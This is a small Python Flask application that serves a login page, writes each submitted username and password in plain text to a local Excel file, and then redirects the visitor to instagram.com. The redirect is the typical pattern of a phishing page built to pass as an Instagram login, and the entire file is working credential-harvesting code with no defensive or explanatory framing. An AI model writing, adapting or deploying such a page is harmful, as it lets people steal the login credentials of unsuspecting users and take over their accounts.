# app.py
from flask import Flask, render_template, request, redirect
import pandas as pd

app = Flask(__name__)

@app.route('/')
def login():
    return render_template('login.html')

@app.route('/submit', methods=['POST'])
def submit():
    username = request.form['username']
    password = request.form['password']

    # Save credentials to Excel
    data = {'Username': [username], 'Password': [password]}
    df = pd.DataFrame(data)
    try:
        existing_df = pd.read_excel('credentials.xlsx')
        df = pd.concat([existing_df, df], ignore_index=True)
    except FileNotFoundError:
        pass
    df.to_excel('credentials.xlsx', index=False)

    return redirect('https://www.instagram.com')

if __name__ == '__main__':
    app.run(debug=True)
